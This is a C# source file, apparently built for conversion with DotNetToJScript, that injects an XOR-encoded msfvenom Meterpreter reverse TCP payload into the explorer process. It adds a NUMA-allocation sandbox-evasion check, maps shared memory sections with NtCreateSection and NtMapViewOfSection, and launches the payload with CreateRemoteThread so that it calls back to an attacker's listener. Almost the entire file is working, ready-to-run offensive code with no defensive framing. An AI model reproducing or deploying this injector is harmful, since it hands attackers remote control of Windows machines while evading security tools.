//    This file is part of DotNetToJScript.
//    Copyright (C) James Forshaw 2017
//
//    DotNetToJScript is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    DotNetToJScript is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with DotNetToJScript.  If not, see <http://www.gnu.org/licenses/>.

using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Windows.Forms;


namespace RemoteShinjectLowlevel
{
    [ComVisible(true)]
    public class TestClass
{
    // FOR DEBUGGING
    [DllImport("kernel32.dll")]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

    [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
    static extern int memcmp(byte[] b1, byte[] b2, long count);

    static bool ByteArrayCompare(byte[] b1, byte[] b2)
    {
        return b1.Length == b2.Length && memcmp(b1, b2, b1.Length) == 0;
    }
    // END DEBUGGING

    public const uint ProcessAllFlags = 0x001F0FFF;
    public const uint GenericAll = 0x10000000;
    public const uint PageReadWrite = 0x04;
    public const uint PageReadExecute = 0x20;
    public const uint PageReadWriteExecute = 0x40;
    public const uint SecCommit = 0x08000000;

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);


    [DllImport("ntdll.dll", SetLastError = true)]
    static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize,
        UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize,
        out ulong SectionOffset, out uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

    [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
    static extern int NtClose(IntPtr hObject);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();
    public TestClass()
    {
        // Sandbox evasion
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if (mem == null)
        {
            return;
        }

        // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f csharp
        // XORed with key 0xfa
        byte[] buf = new byte[768] { 0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, 0xfa, 0xfa, 0xbb, 0xab, 0xbb, 0xaa, 0xa8, 0xb2, 0xcb, 0x28, 0xab, 0xac, 0x9f, 0xb2, 0x71, 0xa8, 0x9a, 0xb2, 0x71, 0xa8, 0xe2, 0xb2, 0x71, 0xa8, 0xda, 0xb2, 0x71, 0x88, 0xaa, 0xb2, 0xf5, 0x4d, 0xb0, 0xb0, 0xb7, 0xcb, 0x33, 0xb2, 0xcb, 0x3a, 0x56, 0xc6, 0x9b, 0x86, 0xf8, 0xd6, 0xda, 0xbb, 0x3b, 0x33, 0xf7, 0xbb, 0xfb, 0x3b, 0x18, 0x17, 0xa8, 0xb2, 0x71, 0xa8, 0xda, 0xbb, 0xab, 0x71, 0xb8, 0xc6, 0xb2, 0xfb, 0x2a, 0x9c, 0x7b, 0x82, 0xe2, 0xf1, 0xf8, 0xf5, 0x7f, 0x88, 0xfa, 0xfa, 0xfa, 0x71, 0x7a, 0x72, 0xfa, 0xfa, 0xfa, 0xb2, 0x7f, 0x3a, 0x8e, 0x9d, 0xb2, 0xfb, 0x2a, 0xbe, 0x71, 0xba, 0xda, 0xaa, 0x71, 0xb2, 0xe2, 0xb3, 0xfb, 0x2a, 0x19, 0xac, 0xb2, 0x05, 0x33, 0xb7, 0xcb, 0x33, 0xbb, 0x71, 0xce, 0x72, 0xb2, 0xfb, 0x2c, 0xb2, 0xcb, 0x3a, 0xbb, 0x3b, 0x33, 0xf7, 0x56, 0xbb, 0xfb, 0x3b, 0xc2, 0x1a, 0x8f, 0x0b, 0xb6, 0xf9, 0xb6, 0xde, 0xf2, 0xbf, 0xc3, 0x2b, 0x8f, 0x22, 0xa2, 0xbe, 0x71, 0xba, 0xde, 0xb3, 0xfb, 0x2a, 0x9c, 0xbb, 0x71, 0xf6, 0xb2, 0xbe, 0x71, 0xba, 0xe6, 0xb3, 0xfb, 0x2a, 0xbb, 0x71, 0xfe, 0x72, 0xbb, 0xa2, 0xbb, 0xa2, 0xb2, 0xfb, 0x2a, 0xa4, 0xa3, 0xa0, 0xbb, 0xa2, 0xbb, 0xa3, 0xbb, 0xa0, 0xb2, 0x79, 0x16, 0xda, 0xbb, 0xa8, 0x05, 0x1a, 0xa2, 0xbb, 0xa3, 0xa0, 0xb2, 0x71, 0xe8, 0x13, 0xb1, 0x05, 0x05, 0x05, 0xa7, 0xb2, 0xcb, 0x21, 0xa9, 0xb3, 0x44, 0x8d, 0x93, 0x94, 0x93, 0x94, 0x9f, 0x8e, 0xfa, 0xbb, 0xac, 0xb2, 0x73, 0x1b, 0xb3, 0x3d, 0x38, 0xb6, 0x8d, 0xdc, 0xfd, 0x05, 0x2f, 0xa9, 0xa9, 0xb2, 0x73, 0x1b, 0xa9, 0xa0, 0xb7, 0xcb, 0x3a, 0xb7, 0xcb, 0x33, 0xa9, 0xa9, 0xb3, 0x40, 0xc0, 0xac, 0x83, 0x5d, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0x12, 0xf4, 0xfa, 0xfa, 0xfa, 0xcb, 0xc3, 0xc8, 0xd4, 0xcb, 0xcc, 0xc2, 0xd4, 0xce, 0xc3, 0xd4, 0xcd, 0xc3, 0xfa, 0xa0, 0xb2, 0x73, 0x3b, 0xb3, 0x3d, 0x3a, 0x41, 0xfb, 0xfa, 0xfa, 0xb7, 0xcb, 0x33, 0xa9, 0xa9, 0x90, 0xf9, 0xa9, 0xb3, 0x40, 0xad, 0x73, 0x65, 0x3c, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0x12, 0x2c, 0xfa, 0xfa, 0xfa, 0xd5, 0xbb, 0xca, 0xcc, 0x8e, 0x94, 0xca, 0x83, 0xc2, 0x98, 0xab, 0xac, 0xae, 0x89, 0x96, 0xb1, 0x8d, 0xb7, 0x94, 0xcd, 0x95, 0x9f, 0xbb, 0x82, 0xc8, 0xc2, 0xa0, 0x8a, 0xb9, 0x97, 0x8b, 0xbe, 0xaa, 0x82, 0xbc, 0x96, 0xa9, 0xb8, 0xbc, 0xac, 0xa8, 0x8e, 0x8e, 0xad, 0xb9, 0x97, 0x8d, 0xb8, 0x9c, 0x83, 0x98, 0xcf, 0x97, 0xb3, 0xc8, 0xcd, 0x90, 0xb6, 0xb2, 0xcb, 0xc2, 0xab, 0x8b, 0xac, 0xb3, 0xa3, 0xce, 0xb0, 0x82, 0xa3, 0xc3, 0xaa, 0x9c, 0xc9, 0xb9, 0x99, 0x8a, 0xb6, 0xb3, 0xd7, 0x99, 0xb8, 0x90, 0x99, 0xbc, 0xa5, 0x82, 0xa8, 0xb1, 0xc3, 0xb5, 0xa0, 0x96, 0xb7, 0x91, 0xbe, 0xbf, 0xb5, 0x97, 0xa8, 0xa2, 0xb7, 0x93, 0xa8, 0xc9, 0x9f, 0xa0, 0x8b, 0xbe, 0xc2, 0xb2, 0xb3, 0xa8, 0x92, 0xb2, 0xcf, 0xa8, 0xb0, 0xa5, 0xb6, 0x8d, 0xcc, 0x8b, 0x91, 0xbf, 0x88, 0x83, 0x97, 0x91, 0x83, 0xb8, 0x91, 0xcd, 0xaf, 0xcf, 0xd7, 0xcf, 0xb7, 0xa3, 0x8a, 0xbb, 0x95, 0x92, 0xbb, 0xb2, 0xb7, 0xcd, 0x8e, 0xc9, 0x8d, 0xb7, 0xbc, 0x82, 0xa2, 0xab, 0x82, 0xb0, 0xbf, 0x97, 0xa8, 0x99, 0x8b, 0xa0, 0xc9, 0x9f, 0xae, 0x8d, 0x8c, 0xbe, 0xd7, 0x9e, 0x8f, 0x95, 0x89, 0x8c, 0xbd, 0xb1, 0xc2, 0x94, 0xb4, 0x94, 0xa8, 0x80, 0xb1, 0xa8, 0x98, 0xd7, 0xd7, 0xca, 0x96, 0xca, 0xa0, 0x90, 0xb9, 0xb5, 0x8c, 0x89, 0x91, 0xad, 0xb9, 0x9b, 0xb0, 0x96, 0xb6, 0xa9, 0xa0, 0x8b, 0x95, 0xa8, 0xa2, 0xa2, 0x80, 0xcc, 0xfa, 0xb2, 0x73, 0x3b, 0xa9, 0xa0, 0xbb, 0xa2, 0xb7, 0xcb, 0x33, 0xa9, 0xb2, 0x42, 0xfa, 0xc8, 0x52, 0x7e, 0xfa, 0xfa, 0xfa, 0xfa, 0xaa, 0xa9, 0xa9, 0xb3, 0x3d, 0x38, 0x11, 0xaf, 0xd4, 0xc1, 0x05, 0x2f, 0xb2, 0x73, 0x3c, 0x90, 0xf0, 0xa5, 0xb2, 0x73, 0x0b, 0x90, 0xe5, 0xa0, 0xa8, 0x92, 0x7a, 0xc9, 0xfa, 0xfa, 0xb3, 0x73, 0x1a, 0x90, 0xfe, 0xbb, 0xa3, 0xb3, 0x40, 0x8f, 0xbc, 0x64, 0x7c, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb7, 0xcb, 0x3a, 0xa9, 0xa0, 0xb2, 0x73, 0x0b, 0xb7, 0xcb, 0x33, 0xb7, 0xcb, 0x33, 0xa9, 0xa9, 0xb3, 0x3d, 0x38, 0xd7, 0xfc, 0xe2, 0x81, 0x05, 0x2f, 0x7f, 0x3a, 0x8f, 0xe5, 0xb2, 0x3d, 0x3b, 0x72, 0xe9, 0xfa, 0xfa, 0xb3, 0x40, 0xbe, 0x0a, 0xcf, 0x1a, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x05, 0x35, 0x8e, 0xf8, 0x11, 0x50, 0x12, 0xaf, 0xfa, 0xfa, 0xfa, 0xa9, 0xa3, 0x90, 0xba, 0xa0, 0xb3, 0x73, 0x2b, 0x3b, 0x18, 0xea, 0xb3, 0x3d, 0x3a, 0xfa, 0xea, 0xfa, 0xfa, 0xb3, 0x40, 0xa2, 0x5e, 0xa9, 0x1f, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x69, 0xa9, 0xa9, 0xb2, 0x73, 0x1d, 0xb2, 0x73, 0x0b, 0xb2, 0x73, 0x20, 0xb3, 0x3d, 0x3a, 0xfa, 0xda, 0xfa, 0xfa, 0xb3, 0x73, 0x03, 0xb3, 0x40, 0xe8, 0x6c, 0x73, 0x18, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x79, 0x3e, 0xda, 0x7f, 0x3a, 0x8e, 0x48, 0x9c, 0x71, 0xfd, 0xb2, 0xfb, 0x39, 0x7f, 0x3a, 0x8f, 0x28, 0xa2, 0x39, 0xa2, 0x90, 0xfa, 0xa3, 0x41, 0x1a, 0xe7, 0xd0, 0xf0, 0xbb, 0x73, 0x20, 0x05, 0x2f };

        int len = buf.Length;
        uint uLen = (uint)len;

        // Get a handle on the local process
        IntPtr lHandle = Process.GetCurrentProcess().Handle;
        Console.WriteLine($"Got handle {lHandle} on local process.");

        // Grab the right PID
        string targetedProc = "explorer"; //change :)
        int procId = Process.GetProcessesByName(targetedProc).First().Id;

        // Get a handle on the remote process
        IntPtr pHandle = OpenProcess(ProcessAllFlags, false, procId);
        Console.WriteLine($"Got handle {pHandle} on PID {procId} ({targetedProc}).");

        // Create a RWX memory section with the size of the payload using 'NtCreateSection'
        IntPtr sHandle = new IntPtr();
        long cStatus = NtCreateSection(ref sHandle, GenericAll, IntPtr.Zero, ref uLen, PageReadWriteExecute, SecCommit, IntPtr.Zero);
        Console.WriteLine($"Created new shared memory section with handle {sHandle}. Success: {cStatus == 0}.");

        // Map a view of the created section (sHandle) for the LOCAL process using 'NtMapViewOfSection'
        IntPtr baseAddrL = new IntPtr();
        uint viewSizeL = uLen;
        ulong sectionOffsetL = new ulong();
        long mStatusL = NtMapViewOfSection(sHandle, lHandle, ref baseAddrL, IntPtr.Zero, IntPtr.Zero, out sectionOffsetL, out viewSizeL, 2, 0, PageReadWrite);
        Console.WriteLine($"Mapped local memory section with base address {baseAddrL} (viewsize: {viewSizeL}, offset: {sectionOffsetL}). Success: {mStatusL == 0}.");

        // Map a view of the same section for the specified REMOTE process (pHandle) using 'NtMapViewOfSection'
        IntPtr baseAddrR = new IntPtr();
        uint viewSizeR = uLen;
        ulong sectionOffsetR = new ulong();
        long mStatusR = NtMapViewOfSection(sHandle, pHandle, ref baseAddrR, IntPtr.Zero, IntPtr.Zero, out sectionOffsetR, out viewSizeR, 2, 0, PageReadExecute);
        Console.WriteLine($"Mapped remote memory section with base address {baseAddrR} (viewsize: {viewSizeR}, offset: {sectionOffsetR}). Success: {mStatusR == 0}.");

        // Decode shellcode
        for (int i = 0; i < buf.Length; i++)
        {
            buf[i] = (byte)((uint)buf[i] ^ 0xfa);
        }

        // Copy shellcode to locally mapped view, which will be reflected in the remote mapping
        Marshal.Copy(buf, 0, baseAddrL, len);
        Console.WriteLine($"Copied shellcode to locally mapped memory at address {baseAddrL}.");

        // DEBUG: Read memory at remote address and verify it's the same as the intended shellcode
        byte[] remoteMemory = new byte[len];
        IntPtr noBytesRead = new IntPtr();
        bool result = ReadProcessMemory(pHandle, baseAddrR, remoteMemory, remoteMemory.Length, out noBytesRead);
        bool sameSame = ByteArrayCompare(buf, remoteMemory);
        Console.WriteLine($"DEBUG: Checking if shellcode is correctly placed remotely...");
        if (sameSame != true)
        {
            Console.WriteLine("DEBUG: NOT THE SAME! ABORTING EXECUTION.");
            return;
        }
        else
        {
            Console.WriteLine("DEBUG: OK.");
        }
        // END DEBUG

        // Execute the remotely mapped memory using 'CreateRemoteThread' (EWWW high-level APIs!!!)
        if (CreateRemoteThread(pHandle, IntPtr.Zero, 0, baseAddrR, IntPtr.Zero, 0, IntPtr.Zero) != IntPtr.Zero)
        {
            Console.WriteLine("Injection done! Check your listener!");
        }
        else
        {
            Console.WriteLine("Injection failed!");
        }

        // Unmap the locally mapped section view using 'NtUnMapViewOfSection'
        uint uStatusL = NtUnmapViewOfSection(lHandle, baseAddrL);
        Console.WriteLine($"Unmapped local memory section. Success: {uStatusL == 0}.");

        // Close the section
        int clStatus = NtClose(sHandle);
        Console.WriteLine($"Closed memory section. Success: {clStatus == 0}.");
    }
}
}
